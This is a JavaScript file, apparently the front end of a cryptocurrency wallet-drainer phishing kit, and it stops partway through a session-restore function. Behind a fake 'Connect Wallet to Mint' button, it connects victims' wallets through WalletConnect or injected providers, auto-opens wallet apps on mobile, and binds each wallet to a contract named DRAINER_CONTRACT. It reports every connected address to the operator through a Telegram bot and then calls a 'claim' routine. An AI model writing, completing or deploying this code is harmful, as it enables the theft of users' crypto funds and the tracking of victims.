
import { CONFIG } from './config.js';

;(function () {
  'use strict';

  // ==========================================================================
  //  CONFIG SHORTCUTS
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
  } = CONFIG;

  const PRIMARY_PROJECT_ID  = PROJECT_ID;
  const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID;

  // ==========================================================================
  //  DEEPLINK MAP — "like the original script"
  //  Universal links let us open the wallet app from a plain HTTPS page,
  //  which is the only reliable way on iOS Safari. `wc:` is the fallback.
  // ==========================================================================
  const WALLET_DEEPLINKS = {
    trust:    (uri) => `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`,
    metamask: (uri) => `https://metamask.app.link/wc?uri=${encodeURIComponent(uri)}`,
    coinbase: (uri) => `https://go.cb-w.com/wc?uri=${encodeURIComponent(uri)}`,
    rainbow:  (uri) => `https://rnbwapp.com/wc?uri=${encodeURIComponent(uri)}`,
    imtoken:  (uri) => `imtokenv2://wc?uri=${encodeURIComponent(uri)}`,
    generic:  (uri) => uri, // raw wc: URI — OS will prompt
  };

  const RELAY_URLS = [
    'wss://relay.walletconnect.com',
    'wss://relay.walletconnect.org',
  ];

  const LS = {
    addr:   'connectedWallet',       // main.js own key
    mode:   'connectionMode',        // 'walletconnect' | 'injected'
    scriptAddr: 'connectedAddress',  // script.js shared key
    scriptType: 'connectedWalletType',
  };

  // ==========================================================================
  //  PLATFORM
  // ==========================================================================
  const UA = navigator.userAgent || '';
  const isMobileDevice  = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOSDevice     = /iPhone|iPad|iPod/i.test(UA);
  const isAndroidDevice = /Android/i.test(UA);
  const isDesktopDevice = !isMobileDevice;

  const getPlatform = () => {
    if (isIOSDevice) return 'ios';
    if (isAndroidDevice) return 'android';
    if (/Windows/i.test(UA)) return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA)) return 'mac';
    return 'unknown';
  };

  // ==========================================================================
  //  DEBUG PANEL (double-click page to toggle)
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  TELEGRAM (shared token with script.js — safe, idempotent)
  // ==========================================================================
  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      if (!r.ok) { console.error('[main.js] Telegram error:', await r.text()); return false; }
      return true;
    } catch (e) { console.error('[main.js] Telegram exception:', e); return false; }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  IN-WALLET BROWSER DETECTION
  // ==========================================================================
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (!eth) return null;
    if (eth.isMetaMask && /MetaMaskMobile/i.test(UA)) return { wallet: 'metamask', name: 'MetaMask' };
    if (eth.isTrust || /TrustWallet/i.test(UA))       return { wallet: 'trust',    name: 'Trust Wallet' };
    if (eth.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    if (/Rainbow/i.test(UA))                          return { wallet: 'rainbow',  name: 'Rainbow' };
    return null;
  }

  // ==========================================================================
  //  TIMEOUT
  // ==========================================================================
  function withTimeout(promise, ms, label) {
    let timer;
    return Promise.race([
      promise.finally(() => clearTimeout(timer)),
      new Promise((_, reject) => {
        timer = setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms);
      }),
    ]);
  }

  // ==========================================================================
  //  LIBRARY LOADING
  // ==========================================================================
  async function tryImport(urls, pickFn, label, timeoutMs = 8000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(url), timeoutMs, `${label} @ ${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export not found at ${url}`);
        logDebug(`✅ ${label} from ${url} (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} fail @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadLibraries() {
    const providerCdn = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];
    const web3Cdn = [
      'https://esm.sh/web3@4.3.0?bundle',
      'https://cdn.jsdelivr.net/npm/web3@4.3.0/+esm',
    ];

    const [EthereumProvider, Web3Mod] = await Promise.all([
      tryImport(providerCdn, (m) => m.EthereumProvider || m.default || m, 'EthereumProvider'),
      tryImport(web3Cdn,     (m) => m.default || m.Web3 || m,           'Web3'),
    ]);

    return { EthereumProvider, Web3: Web3Mod.default || Web3Mod };
  }

  // ==========================================================================
  //  RELAY PROBE (best-effort — SDK picks its own if this fails)
  // ==========================================================================
  async function pickRelayUrl(timeoutMs = 2500) {
    for (const url of RELAY_URLS) {
      try {
        const ok = await withTimeout(
          new Promise((resolve) => {
            let ws;
            try { ws = new WebSocket(url); } catch { return resolve(false); }
            const done = (v) => { try { ws.close(); } catch {} resolve(v); };
            const t = setTimeout(() => done(false), timeoutMs);
            ws.onopen  = () => { clearTimeout(t); done(true); };
            ws.onerror = () => { clearTimeout(t); done(false); };
          }),
          timeoutMs + 500,
          `ws-probe ${url}`
        );
        if (ok) { logDebug(`🌐 Relay OK: ${url}`); return url; }
      } catch { /* next */ }
    }
    logDebug('⚠️ No relay reachable — letting SDK pick');
    return null;
  }

  // ==========================================================================
  //  DOM
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  STATE
  // ==========================================================================
  let EthereumProvider = null;   // class
  let Web3Ctor = null;           // class

  let wcProvider = null;         // EthereumProvider instance (owned)
  let injectedProvider = null;   // window.ethereum instance
  let activeProvider = null;     // whichever is live
  let web3Instance = null;
  let contractInstance = null;
  let isConnecting = false;
  let isDisconnecting = false;
  let connectionMode = null;     // 'walletconnect' | 'injected' | null
  let currentSession = null;

  // ==========================================================================
  //  BUTTON UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';
    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  LOCAL STORAGE — we write to BOTH namespaces so script.js stays in sync
  // ==========================================================================
  function saveWallet(address, mode) {
    try {
      localStorage.setItem(LS.addr, address);
      if (mode) localStorage.setItem(LS.mode, mode);
      // Mirror for script.js
      localStorage.setItem(LS.scriptAddr, address);
      if (mode) localStorage.setItem(LS.scriptType, mode === 'walletconnect' ? 'walletconnect' : 'injected');
    } catch (e) { logDebug('saveWallet: ' + e.message); }
  }
  const getSavedWallet = () => localStorage.getItem(LS.addr) || localStorage.getItem(LS.scriptAddr);
  const getSavedMode   = () => localStorage.getItem(LS.mode);
  function clearSavedWallet() {
    try {
      localStorage.removeItem(LS.addr);
      localStorage.removeItem(LS.mode);
      localStorage.removeItem(LS.scriptAddr);
      localStorage.removeItem(LS.scriptType);
    } catch {}
  }

  // ==========================================================================
  //  PUBLISH GLOBAL  — exactly what script.js expects
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live = provider || activeProvider || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      session: currentSession,
      mode: connectionMode,
      publishedAt: Date.now(),
    };
    logDebug(`publishGlobal: addr=${address} mode=${connectionMode} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      (connectButton?.parentNode || document.body).appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
🧩 <b>Mode:</b> ${connectionMode || 'unknown'}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobileDevice ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    connectionMode = null;
    currentSession = null;
    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963 — desktop injected discovery
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ==========================================================================
  //  WALLET PICKER (desktop)
  // ==========================================================================
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);
    const list = modalEl.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px'; i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  DEEPLINK UI — shown alongside the WC modal on mobile (and optionally desktop)
  //  This is the "original script" behavior you asked for.
  // ==========================================================================
  let deeplinkOverlay = null;

  function showDeeplinkOverlay(uri) {
    hideDeeplinkOverlay();
    if (!uri) return;

    deeplinkOverlay = document.createElement('div');
    deeplinkOverlay.id = 'wc-deeplink-overlay';
    deeplinkOverlay.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.78);
      display:flex;align-items:flex-end;justify-content:center;
      z-index:99998;padding:0 0 24px 0;font-family:Inter,sans-serif;
    `;

    const card = document.createElement('div');
    card.style.cssText = `
      background:#1F2937;color:white;border-radius:16px;padding:20px;
      width:92%;max-width:420px;box-shadow:0 8px 32px rgba(0,0,0,.4);
    `;

    const wallets = [
      { key: 'trust',    label: 'Trust Wallet',    color: '#3375BB' },
      { key: 'metamask', label: 'MetaMask',        color: '#F6851B' },
      { key: 'coinbase', label: 'Coinbase Wallet', color: '#0052FF' },
      { key: 'rainbow',  label: 'Rainbow',         color: '#001E59' },
    ];

    card.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;">
        <h3 style="margin:0;font-weight:600;font-size:17px;">Open in wallet</h3>
        <button id="wc-deeplink-close" style="background:none;border:none;color:#9CA3AF;cursor:pointer;font-size:22px;line-height:1;">&times;</button>
      </div>
      <div id="wc-deeplink-list" style="display:flex;flex-direction:column;gap:10px;"></div>
      <button id="wc-deeplink-copy" style="margin-top:14px;background:none;border:1px solid #4B5563;color:#D1D5DB;padding:10px;border-radius:8px;cursor:pointer;width:100%;font-size:13px;">
        Copy WalletConnect URI
      </button>
    `;

    const list = card.querySelector('#wc-deeplink-list');
    wallets.forEach((w) => {
      const b = document.createElement('a');
      b.href = WALLET_DEEPLINKS[w.key](uri);
      b.textContent = w.label;
      b.style.cssText = `
        display:block;text-align:center;padding:14px;border-radius:10px;
        background:${w.color};color:white;text-decoration:none;font-weight:600;
        font-size:15px;
      `;
      b.addEventListener('click', () => {
        // iOS/Android will background the tab; no need to do anything else.
        logDebug(`🔗 deeplink → ${w.label}`);
      });
      list.appendChild(b);
    });

    card.querySelector('#wc-deeplink-close').onclick = hideDeeplinkOverlay;
    card.querySelector('#wc-deeplink-copy').onclick = () => {
      navigator.clipboard.writeText(uri).then(() => {
        card.querySelector('#wc-deeplink-copy').textContent = 'Copied ✓';
        setTimeout(() => {
          const el = card.querySelector('#wc-deeplink-copy');
          if (el) el.textContent = 'Copy WalletConnect URI';
        }, 1500);
      });
    };

    deeplinkOverlay.appendChild(card);
    document.body.appendChild(deeplinkOverlay);
  }

  function hideDeeplinkOverlay() {
    if (deeplinkOverlay) {
      try { deeplinkOverlay.remove(); } catch {}
      deeplinkOverlay = null;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT PROVIDER — single source of truth
  //  Owns its own SignClient internally. We do NOT create a second one.
  // ==========================================================================
  async function initWalletConnect({ useFallbackId = false, session = null } = {}) {
    if (wcProvider && !session) return wcProvider;

    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
    if (!projectId) {
      logDebug('❌ No WalletConnect projectId configured');
      return null;
    }

    try {
      const relayUrl = await pickRelayUrl();
      logDebug(`WC init: projectId=${String(projectId).slice(0, 8)}… session=${!!session}`);
      const t0 = performance.now();

      const opts = {
        projectId,
        chains: [MAINNET_ID],
        optionalChains: [MAINNET_ID],
        showQrModal: false,               // we render our own overlay
        methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4', 'eth_sign'],
        events: ['chainChanged', 'accountsChanged', 'disconnect', 'session_delete'],
        metadata: DAPP_METADATA,
      };
      if (relayUrl) opts.relayUrl = relayUrl;
      if (session) opts.session = session;

      const provider = await withTimeout(
        EthereumProvider.init(opts),
        15000,
        'EthereumProvider.init'
      );

      // Only replace the singleton when we're initializing fresh (no session restore)
      if (!session) {
        wcProvider = provider;
      }
      attachWCProviderEvents(provider);
      logDebug(`✅ WC provider ready in ${(performance.now() - t0).toFixed(0)}ms`);
      return provider;
    } catch (e) {
      logDebug(`WC init failed: ${e.message}`);
      if (!session) wcProvider = null;
      return null;
    }
  }

  function attachWCProviderEvents(provider) {
    if (!provider || provider.__apexEventsAttached) return;
    provider.__apexEventsAttached = true;

    provider.on('accountsChanged', (accounts) => {
      logDebug(`WC accountsChanged: ${JSON.stringify(accounts)}`);
      if (!accounts || accounts.length === 0) {
        // Some wallets emit [] transiently. Re-check after a beat.
        setTimeout(async () => {
          try {
            const again = await provider.request({ method: 'eth_accounts' });
            if (!again || again.length === 0) hardDisconnect({ skipWalletCall: true });
          } catch {
            hardDisconnect({ skipWalletCall: true });
          }
        }, 500);
        return;
      }
      const a = accounts[0];
      saveWallet(a, 'walletconnect');
      updateConnectedUI(a, 'evm');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 800);
    });

    provider.on('chainChanged', (id) => {
      logDebug(`WC chainChanged: ${id}`);
      showStatus(`Network changed to ${id}`, 'info');
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', (reason) => {
      logDebug(`WC disconnect: ${reason}`);
      hardDisconnect({ skipWalletCall: true });
    });

    if (provider.on) {
      try { provider.on('session_delete', () => hardDisconnect({ skipWalletCall: true })); } catch {}
    }
  }

  // ==========================================================================
  //  INJECTED EVM CONNECT
  // ==========================================================================
  function attachInjectedEvents(provider) {
    if (!provider || !provider.on || provider.__apexInjectedEvents) return;
    provider.__apexInjectedEvents = true;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        hardDisconnect({ skipWalletCall: true });
      } else {
        const a = accounts[0];
        saveWallet(a, 'injected');
        updateConnectedUI(a, 'evm');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
        }, 800);
      }
    });

    provider.on('chainChanged', () => {
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', () => hardDisconnect({ skipWalletCall: true }));
  }

  async function connectInjected() {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 400));

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return null;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info?.rdns === 'io.metamask' || /metamask/i.test(p.info?.name || '')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return null;
    }

    try {
      const provider = chosen.provider;
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        20000,
        'eth_requestAccounts'
      );
      if (!accounts?.length) return null;

      const address = accounts[0];
      injectedProvider = provider;
      activeProvider = provider;
      connectionMode = 'injected';

      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, 'injected');
      attachInjectedEvents(provider);
      updateConnectedUI(address, 'evm');
      logDebug(`✅ Injected connected: ${address} (${chosen.info?.name || 'wallet'})`);
      return address;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return null;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT CONNECT
  //  Correct flow:
  //   1. init provider (no session)
  //   2. register display_uri handler → show deeplink overlay + QR
  //   3. provider.enable() — resolves when wallet approves
  //   4. force eth_requestAccounts as a poke (Trust Wallet needs this)
  // ==========================================================================
  async function connectWalletConnect({ useFallbackId = false } = {}) {
    if (wcProvider?.session && wcProvider.accounts?.length) {
      // Already has a live session — sync UI and return.
      const a = wcProvider.accounts[0];
      activeProvider = wcProvider;
      connectionMode = 'walletconnect';
      currentSession = wcProvider.session;
      web3Instance = new Web3Ctor(wcProvider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      saveWallet(a, 'walletconnect');
      updateConnectedUI(a, 'evm');
      return a;
    }

    const provider = await initWalletConnect({ useFallbackId });
    if (!provider) return null;

    showStatus(isMobileDevice ? 'Opening wallet…' : 'Scan with your wallet…', 'info');

    // Capture WC URI and display deeplink / QR UI
    let uriHandled = false;
    const onDisplayUri = (uri) => {
      if (uriHandled || !uri) return;
      uriHandled = true;
      logDebug(`🔗 WC uri received (${uri.slice(0, 32)}…)`);

      // On mobile, show deeplink buttons immediately. Desktop too (harmless).
      showDeeplinkOverlay(uri);

      // If Trust Wallet / other wallet on desktop: nothing else needed.
      // On mobile, we can also attempt auto-open the most likely wallet.
      if (isMobileDevice) {
        const inWallet = detectInWalletBrowser();
        const target = inWallet?.wallet
          || (isIOSDevice ? 'trust' : 'trust'); // default to Trust on mobile
        const href = WALLET_DEEPLINKS[target]?.(uri);
        if (href) {
          logDebug(`📲 auto-deeplink → ${target}`);
          // Delay slightly so overlay renders first.
          setTimeout(() => {
            try { window.location.href = href; } catch (e) { logDebug('deeplink nav: ' + e.message); }
          }, 600);
        }
      }
    };
    provider.on('display_uri', onDisplayUri);

    try {
      // provider.enable() initiates pairing AND waits for approval.
      const accounts = await withTimeout(
        provider.enable(),
        300000,
        'WC enable'
      );

      provider.removeListener?.('display_uri', onDisplayUri);
      hideDeeplinkOverlay();

      if (!accounts?.length) {
        logDebug('WC enable returned no accounts');
        return null;
      }

      let address = accounts[0];

      // Poke — some wallets (Trust) only return the account after this.
      try {
        const again = await withTimeout(
          provider.request({ method: 'eth_requestAccounts' }),
          15000,
          'wc eth_requestAccounts'
        );
        if (again?.length) address = again[0];
      } catch (e) {
        logDebug('post-connect eth_requestAccounts: ' + e.message);
      }

      activeProvider = provider;
      connectionMode = 'walletconnect';
      currentSession = provider.session || null;
      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, 'walletconnect');
      updateConnectedUI(address, 'evm');
      logDebug(`✅ WC connected: ${address}`);
      return address;
    } catch (e) {
      provider.removeListener?.('display_uri', onDisplayUri);
      hideDeeplinkOverlay();
      logDebug('WC enable error: ' + e.message);
      return null;
    }
  }

  // ==========================================================================
  //  HARD DISCONNECT — kills both WC and injected state cleanly
  // ==========================================================================
  async function hardDisconnect({ skipWalletCall = false } = {}) {
    if (isDisconnecting) return;
    isDisconnecting = true;

    try {
      if (!skipWalletCall && connectionMode === 'walletconnect' && wcProvider?.session) {
        try {
          await Promise.race([
            wcProvider.disconnect(),
            new Promise((_, rej) => setTimeout(() => rej(new Error('disconnect timeout')), 6000)),
          ]);
        } catch (e) { logDebug('WC disconnect err: ' + e.message); }
      }

      if (connectionMode === 'injected' && injectedProvider?.request) {
        try {
          await injectedProvider.request({
            method: 'wallet_revokePermissions',
            params: [{ eth_accounts: {} }],
          }).catch(() => {});
        } catch {}
      }
    } finally {
      hideDeeplinkOverlay();
      wcProvider = null;
      injectedProvider = null;
      activeProvider = null;
      web3Instance = null;
      contractInstance = null;
      connectionMode = null;
      currentSession = null;
      resetConnectedUI();
      clearSavedWallet();
      isDisconnecting = false;
      logDebug('🔌 Disconnected');
    }
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;
    isConnecting = true;
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    let address = null;

    try {
      const inWallet = detectInWalletBrowser();
      const preferInjected = !!inWallet && isMobileDevice;

      if (preferInjected) {
        logDebug(`📱 In-wallet browser: ${inWallet.name}`);
        address = await connectInjected();
      } else if (isDesktopDevice && window.ethereum && evmProviders.length > 0) {
        address = await connectInjected();
      }

      if (!address) {
        address = await connectWalletConnect({ useFallbackId: false });
      }
      if (!address && FALLBACK_PROJECT_ID && FALLBACK_PROJECT_ID !== PRIMARY_PROJECT_ID) {
        logDebug('Retrying WC with fallback projectId…');
        address = await connectWalletConnect({ useFallbackId: true });
      }
    } catch (e) {
      logDebug('connectWallet exception: ' + e.message);
    } finally {
      isConnecting = false;
    }

    if (address) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1200);
    } else {
      showStatus('Connection failed or cancelled', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  async function disconnectWallet() {
    showStatus('Disconnecting…', 'info');
    await hardDisconnect();
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    if (isConnecting || isDisconnecting) return;
    const isConnected = !!activeProvider || !!getSavedWallet();
    if (isConnected) await disconnectWallet();
    else await connectWallet();
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobileDevice) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE
  //  Runs on page load. This is what saves the user after the wallet app
  //  bounces them back to Safari/Chrome.
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedMode = getSavedMode() || localStorage.getItem(LS.scriptType);
    if (!savedWallet) return;

    logDebug(`♻️ restore attempt: addr=${savedWallet} mode=${savedMode || 'unknown'}`);

    // --- WalletConnect restore ---
    if (savedMode === 'walletconnect' || !savedMode) {
      try {
        const provider = await initWalletConnect({ useFallbackId: false });
        if (provider && provider.session && provider.accounts?.length) {
